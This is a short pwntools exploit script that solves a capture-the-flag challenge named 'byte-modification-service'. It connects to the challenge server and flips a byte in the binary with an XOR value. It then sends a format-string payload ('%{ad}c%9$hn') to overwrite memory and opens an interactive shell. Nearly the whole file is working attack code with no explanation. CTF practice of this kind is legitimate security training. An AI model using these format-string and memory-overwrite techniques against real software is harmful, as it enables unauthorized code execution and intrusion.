from pwn import *

context.binary = elf = ELF("./chall(5)")

xor_byte = 0x4014fa^0x4014be
pos = 11
index = 0

#p = elf.process()
p = remote("byte-modification-service.challs.csc.tf", 1337)
#gdb.attach(p)
p.sendlineafter("use", str(pos))
p.sendlineafter("Index?", str(index))
p.sendlineafter("with?", str(xor_byte))

ad = 0xffe8
payload = f"%{ad}c%9$hn".encode()
print(payload)
print(len(payload))

p.sendafter("service.", payload.ljust(20, b"\0"))
#p.recvuntil("congratulations")
#a = p.recvall()
#print(a.strip())
#if b"con" in a:
#    print("lmao")
p.interactive()